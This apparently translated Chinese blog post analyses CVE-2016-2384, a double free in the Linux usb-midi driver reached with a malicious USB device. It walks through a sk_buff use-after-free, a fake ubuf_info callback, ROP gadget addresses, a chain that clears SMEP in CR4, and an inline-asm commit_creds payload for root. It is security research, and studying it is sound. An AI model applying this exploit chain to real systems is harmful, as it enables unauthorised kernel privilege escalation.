CVE-2016-2384：针对Linux的BadUSB

Jarry • 2017年2月28日 • 漏洞分析 • 阅读 337

概述

这篇文章描述了usb-midi在Linux内核中的漏洞利用（CVE-2016-2384）。只有启用了usb-midi模块时，该漏洞才会出现，但就我所见，许多发行版都是默认开启的。

利用该漏洞的方式有两种

  • 拒绝服务。需要物理访问（插入恶意USB设备）。所有的内核版本似乎都容易受到这种攻击。我尝试在物理机上安装以下内核Linux，可利用的版本有： Ubuntu 14.04 (3.19.0-49-generic), Linux Mint 17.3 (3.19.0-32-generic), Fedora 22 (4.1.5-200.fe22.x86_64) and CentOS 6 (2.6.32-584.12.2.e16.x86_64)。
  • 任意代码执行与ring0特权的获取。需要物理接触与本地访问权限（需要插入恶意USB与使用非特权用户执行恶意命令），从3.0版本内核以后似乎都容易受到这种攻击。我尝试在物理机上在以下版本内核中获取root权限， Ubuntu 14.04 (3.19.0-49-generic), Linux Mint 17.3 (3.19.0-32-generic) and Fedora 22 (4.1.5-200.fe22.x86_64).这些机器都启用了SMEP，没有使用SMAP。

在文章后半部分附带测试所使用的PoC，测试所使用的恶意USB设备我使用的是Facedancer21，通过文中提供的exp可以绕过SMEP，没有绕过SMAP(如有需要时可能会这样做)。攻击只有50%的成功率（在内核崩溃时会失败），但这部分也许可以改进。

演示视频

实际上在整个攻击过程中可能可以仅用可执行任意代码的硬件完成，去掉本地访问的需求，只是这种方法还没有研究透彻，暂时只作为一种设想。

该漏洞与KASAN（KernelAddressSanitizer，内核内存错误检测器）和vUSBf(虚拟usb fuzzer)一起被发现。

 

The bug

usb-midi驱动的问题发生在插入具有一定数量无效端点的MidiMan USB设备时，因为snd_usb_midi对象被重放而产生，在前文介绍过我使用Facedancer21开发板来物理模拟这样的USB设备，如果你不知道什么是USB端点，或者你对USB协议的工作原理感兴趣可以在这里学习。

USB设备插入时，内核确定哪个驱动程序应该负责这个USB并调用相应的probe()功能。在检测驱动时执行对设备的初始化，当检查到我们精心设计的USB MIDI设备时一切顺利，直到snd_usbmidi_create()代码执行结束:

if (quirk && quirk->type == QUIRK_MIDI_MIDIMAN)
        err = snd_usbmidi_create_endpoints_midiman(umidi, &endpoints[0]);
else
        err = snd_usbmidi_create_endpoints(umidi, endpoints);
if (err < 0) {
        snd_usbmidi_free(umidi);
        return err;
}

如果我使用的是Midiman设备，第一个if就被执行且snd_usbmidi_create_endpoints_midiman()会被调用。从第一二行可以看出此功能只对特定的Midiman USB设备端点执行初始化，那么我们尝试在USB设备描述符中提供无效的端点数（例如0），则snd_usbmidi_create_endpoints_midiman()在以下检查中失败：

if (intfd->bNumEndpoints < (endpoint->out_cables > 0x0001 ? 5 : 3)) {
        dev_dbg(&umidi->dev->dev, "not enough endpoints\n");
        return -ENOENT;
}

之后snd_usbmidi_free()被调用，从而释放对象snd_usb_midi。接下来，由于设备检测失败（使用具有无效端点的USB设备），开始调用各种清理程序，其中被调用的又有snd_usbmidi_free()，导致重复释放snd_usb_midi。

这处bug只会在sound/usb/quirks-table.h中列出触发QUIRK_MIDI_MIDIMAN的设备ID

这里是我用来触发if的错误USB设备描述符。重要的参数是：idVendor = 0x0763（Midiman），idProduct = 0x1002（MidiSport 2×2），其中一个配置需要接口bInterfaceClass = 255和零个端点。其中idProduct可能支持任何MIDIMAN设备。

利用

现在让我们看看我们应该如何利用这处bug。

拒绝服务

造成拒绝服务非常容易。snd_usb_midi重放对系统内核影响很大。所以我们只需要多连接几次恶意USB设备，使内核崩溃。它仅仅需要对机器的物理访问。 这里的脚本用于与Facedancer21USB开发板一起使用，模拟上述USB设备插拔操作。

任意代码执行

执行任意代码也是可以实现的，但是却更难实现。以下是我的实现方式，但它不是唯一可能做到的方式。概括的来讲，我把这个double-free变成了一个racy-use-after-free，并且用指针来覆盖对象，该对象有一个函数指针，而第一个对象仍然被内核使用。

下文会讲到关于slab，如果不知道linux内核slab分配器是如何工作的，或者不知道什么是kmalloc()缓存，可以在这里可以学习，虽然文章是很早以前的了。

这里snd_usb_midi的目的是将释放的缓存通过内核分配到kmalloc()并进入kmalloc-512。每次sk_buff发送数据包时，内核都会创建一个对象。sk_buff发的任何包也都会分配到kmalloc()，根据数据包的大小可能进入kmalloc-512的缓存（例如发送128字节的数据包）。

使用上面的重放bug可能引起sk_buff的 use-after-free。想象一下，当sk_buff对象被分配在两个free()之间，与snd_usb_midi在同一层被放入slab对象，这种情况下，如果slab对象在被释放前再次分配一个sk_buff，则前一个sk_buff会被覆盖。这就是我们要做的。

我们从覆盖的sk_buff中能得到什么？结论是当每一个sk_buff被分配时，skb_shared_info都会被放置在它的结尾处，让我们仔细看看skb_shared_info的定义：

struct skb_shared_info {
 unsigned char nr_frags;
 __u8 tx_flags;
 unsigned short gso_size;
 unsigned short gso_segs;
 unsigned short gso_type;
 struct sk_buff *frag_list;
 struct skb_shared_hwtstamps hwtstamps;
 u32 tskey;
 __be32 ip6_frag_id;
 atomic_t dataref;
 void * destructor_arg;
 skb_frag_t frags[MAX_SKB_FRAGS];
};

在这个skb_shared_info结构中有一个destructor_arg字段，它指向ubuf_info（虽然它被声明为void*指针）。我们接着来看看下面ubuf_info的定义：

struct ubuf_info {
 void (*callback)(struct ubuf_info *, bool zerocopy_success);
 void *ctx;
 unsigned long desc;
};

这里我们发现它包含一个函数指针，可能会在某一个点被调用。

所以我们要覆盖sk_buff中shk_shared_info的destructor_arg区域，并使其指向我们精心准备的ubuf_info，它会返回我们想要的字段。为此，我们需要能从用户空间执行以下三项操作：

  1. 分配512字节的sk_buff
  2. 通过kmalloc()和controlled data分配一个512字节的对象
  3. 触发callback

根据前面的介绍，每发送一个128字节的数据包时，将会分配一个512字节的sk_buff。分配的sk_buff不会被释放，直到数据包发出，socket一直是关闭的。所以我们可以创建几个socket，并从一个socket发送UDP包到另一个socket。

接下来,我们需要一种方法来分配512字节对象与受控数据。实际上，有一种方法可以从用户空间分配对象大小与受控数据。它可以通过系统调用的sendmmsg()发送control message。在sendmmsg()期间，内核会通过kmalloc()和复制消息为control message 分配缓冲区。

现在，我们需要 一种方法来触发callback。在它被调用时相应的sk_buff也会被释放：

static void skb_release_data(struct sk_buff *skb)
{
 struct skb_shared_info *shinfo = skb_shinfo(skb);
 int i;

if (skb->cloned &&
 atomic_sub_return(skb->nohdr ? (1 << SKB_DATAREF_SHIFT) + 1 : 1,
 &shinfo->dataref))
 return;

for (i = 0; i < shinfo->nr_frags; i++)
 __skb_frag_unref(&shinfo->frags[i]);

/*
 * If skb buf is from userspace, we need to notify the caller
 * the lower device DMA has done;
 */
 if (shinfo->tx_flags & SKBTX_DEV_ZEROCOPY) {
 struct ubuf_info *uarg;

uarg = shinfo->destructor_arg;
 if (uarg->callback)
 uarg->callback(uarg, true);
 }

if (shinfo->frag_list)
 kfree_skb_list(shinfo->frag_list);

skb_free_head(skb);
}

如你所见，它只在shinfo->tx_flags有SKBTX_DEV_ZEROCOPY标志时才会被调用，不过我们可以使用我们想要的值以及destructor_arg覆盖它。

那么我们需要做以下几件事：

  1. 释放snd_usb_midi
  2. 使用socket发包时将sk_buff 分配在同一处
  3. 再次释放snd_usb_midi，这一样会释放sk_buff，不过实际上仍在使用（前文有说明原因）
  4. 内存把sendmmsg分配到同一地方，使skb_shared_info覆盖在sk_buff
  5. 释放sk_buff，因此触发callback

这可以通过打开多个socket并且循环发送128字节数据包以及控制消息，同时连接USB设备来实现。这种方法依赖于一组kmalloc()和kfree()通过正确的顺序被调用，我写的exp在执行的时候有比较高的成功率。这样，我们可以控制callback的值去指向任意一个payload，这是通过内核权限去执行，通过使用经典的commit_creds(prepare_kernel_cred(0))payload，我们可以获取root权限。

我们要把ubuf_info分配到哪里呢？这里面可是保存了callback指针。最简单的方法是将它分配到用户空间（作为全局变量）。这同样适用于执行payload（不过我们可以使用ROP，阅读下文）

内核加固

Linux内核支持一些加固功能，使得攻击更加困难。例如，有SMEP（监管模式执行保护）和SMAP（监管模式访问保护）。当内核尝试从用户空间内存中执行代码时，SMEP会导致oop，而当内核尝试直接访问用户空间内存时，SMAP会导致oops。

SMAP和SMEP都是需要在内核端支持的CPU功能。这意味着，只有在以下情况下才启用它们：

  1. CPU支持
  2. 内核支持
  3. 内核配置中被默认启用

从V3.0开始大多内核都支持SMEP，对SMAP的支持则是从3.7开始，在现在的发行版中几乎都被默认启用。然而，虽然英特尔的CPU在几年前（自Ivy Bridge架构开始）开始支持SMEP，但是对SMAP的支持是最近才增加的（从Broadwell架构开始）。所以没有太多CPU支持访问保护。

如果你仔细看我上面描述的利用过程，你会发现，SMEP和SMAP都会从代码开始执行时就被触发。当callback被调用时，SMEP会检测到我们从用户空间执行代码，同时SMAP也会检测到ubuf_info正在从用户空间访问。

当然目前还有另一种Linux的内核加固技术是KASLR（内核地址空间布局随机化）。内核对它的支持是从v3.14开始的，不过在目前大多数发行版本中默认都是禁用它的。

SMEP绕过

现在我将展示如何绕过SMEP，并使对目前许多主流的CUP与内核的攻击变成可能。大多数人常用的做法就是使用内核的ROP（返回导向编程），这也是我要做的。如果你不熟悉ROP，我建议你可以在网上找找相关的资料（我记得蒸米大神在wooyun发过相关文章）。这里我假设我们的CPU是X86-64架构。

我将使用一个xchg eax, esp将堆栈指针设置到用户空间中的特定地址用来控制堆栈，通过ROP禁用SMEP，恢复堆栈指针，然后执行commit_creds(prepare_kernel_cred(0))payload，它会驻留在用户空间的内存中。

首先，让我们来看看调用callback代码的反汇编：

               if (uarg->callback)
ffffffff816c39b9:       48 8b 07                mov    (%rdi),%rax
ffffffff816c39bc:       48 85 c0                test   %rax,%rax
ffffffff816c39bf:       74 07                   je     ffffffff816c39c8 <skb_release_data+0x98>
                        uarg->callback(uarg, true);
ffffffff816c39c1:       be 01 00 00 00          mov    $0x1,%esi
ffffffff816c39c6:       ff d0                   callq  *%rax

我们可以看到，地址callback存储在rax寄存器中，然后callq是用来调用它的。让我们假设callback包含xchg eax, esp ; ret的地址。在这种情况下，callq *%rax将被执行它将交换exa和ESP的值。同时将高于32位的rax和rsp归零（见这个细节）。因此，如果gadget的地址是0xffffffff8100008a那么新的rsp的值将会变成0x000000008100008a，那么这就是一个用户空间地址。如果我们将mmap()这个地址提前，那么我们将获得对堆栈的控制。（附注：假的堆栈将会驻留在用户控件，这是留给SMAP检测的）

现在我们可以把我们的ROP payload放入这个堆栈就OK了。不过有一个问题，假设我们的ROP payload被执行了，那么之后我们需要想个办法让堆栈指针恢复成它的原始值，并返回到从callback中调用的位置，而且我们还不可以继续使用xchg,eax,esp,因为在第一次以后，xchg和rsp已经失去了高于32位的原始值。

然而有一种方法可以让它们恢复到高于32位的值。rbp有一个非常接近rsp的值，因为rsp被保存到rbp每一个函数的开头部分，所以它们都高于32位值的几率很大，所以我们可以只使用高于32位的rbp作为高于32位的rsp和eax的值，xchg指令作为低于32位的rsp的值，最好在xchg之后保存exa的值，so,我们可以在ROP payload中使用rax寄存器，这样就没问题了，我们可以将它和payload中的前几个ROP gadgets保存到用户空间地址中，这实际上就是我们访问用户空间的另一个地方，可以通过SMAP的检测。

我使用以下ROP gadgets来保存eax值：

0xffffffff8118991d : pop rdi ; ret
0xffffffff810fff17 : mov dword ptr [rdi], eax ; ret

因此，payload的第一部分如下：

#define POP_RDI_RET               0xffffffff8118991dL
#define MOV_DWORD_PTR_RDI_EAX_RET 0xffffffff810fff17L

#define CHAIN_SAVE_EAX                  \
  *stack++ = POP_RDI_RET;               \
  *stack++ = (uint64_t)&saved_eax;      \
  *stack++ = MOV_DWORD_PTR_RDI_EAX_RET;

现在，我们的eax已经恢复了，我们可以做一些更有意思的事，例如禁用SMEP。启用或禁用SMEP是由cr4寄存器第二十位控制。在内核中有一些gadgets允许我们设置cr4的值，我用了下面这些：

0xffffffff8118991d : pop rdi ; ret
0xffffffff8105b8f0 : push rbp ; mov rbp, rsp ; mov cr4, rdi ; pop rbp ; ret

注意，第二个gadgets也将返回到rbp寄存器。如果我们省略push，那么它将结束。
结果，有效载荷的下一部分看起来像：

#define POP_RDI_RET               0xffffffff8118991dL
#define MOV_CR4_RDI_RET           0xffffffff8105b8f0L
#define CR4_DESIRED_VALUE         0x407f0

#define CHAIN_SET_CR4                   \
  *stack++ = POP_RDI_RET;               \
  *stack++ = CR4_DESIRED_VALUE;         \
  *stack++ = MOV_CR4_RDI_RET;

现在我们已经禁用了SMEP，我们可以跳转到用户空间执行payload，所以我们不再需要使用ROP了。以下是我使用的gadgets：

0xffffffff810053bc : pop rcx ; ret
0xffffffff81040a90 : jmp rcx

这里是ROP payload的最后一部分：

#define POP_RCX_RET               0xffffffff810053bcL
#define JMP_RCX                   0xffffffff81040a90L

#define CHAIN_JMP_PAYLOAD               \
  *stack++ = POP_RCX_RET;               \
  *stack++ = (uint64_t)&payload;        \
  *stack++ = JMP_RCX;                   \

我们可以在assembly中编写用户空间的payload，这比执行ROP要容易得多。这里是我使用的payload：

// Unfortunately GCC does not support `__atribute__((naked))` on x86, which
// can be used to omit a function's prologue, so I had to use this weird
// wrapper hack as a workaround. Note: Clang does support it, which means it
// has better support of GCC attributes than GCC itself. Funny.
void wrapper() {
  asm volatile ("                         \n\
    payload:                              \n\
      movq %%rbp, %%rax                   \n\
      movq $0xffffffff00000000, %%rdx     \n\
      andq %%rdx, %%rax                   \n\
      movq %0, %%rdx                      \n\
      addq %%rdx, %%rax                   \n\
      movq %%rax, %%rsp                   \n\
      jmp get_root                        \n\
  " : : "m"(saved_eax) : );
}

void payload();

这个payload首先会使用rbp恢复rsp和eax，然后跳转到 get_root() 执行payload,这也就是执行commit_creds(prepare_kernel_cred(0))。可能会有疑问为什么rsp的值要先恢复，这是因为当前内核x线程很容易就被get_root()重新分配了，根据描述，内核线程存储在堆栈的末尾，所以内核不会再开头出找到恢复的rsp。

在get_root() payload被执行后，内核会返回到调用payload的地方，因为最后一个返回地址被放在callq *%rax原始栈上。就这样，我们成功的绕过了SMEP并获得了root权限，这是演示视频。

本文我使用ROPgadget提取gadgets，所有使用的gadgets目前都在现有的内核二进制中（除了jmp rcx,这两个很容易被替换）。注意，gadgets不能从.init.text内核的二进制文件中提取，因为在内核完成启动后代码会被覆盖。

最开始我先寻找类似xchg rax rsp的东西，所以我没有想办法恢复那些rsp，不过后来发现rsp不存在于内核二进制文件。

事实上，slab对象有时候会被缓存在per-cpu列表中，在这种情况下最好是运行一些二进制的文件，数量要大于CPU核心数量，这样的话就至少有一个二进制文件被安排在同一个CPU上执行探测和分配每个CPU的缓存对象。
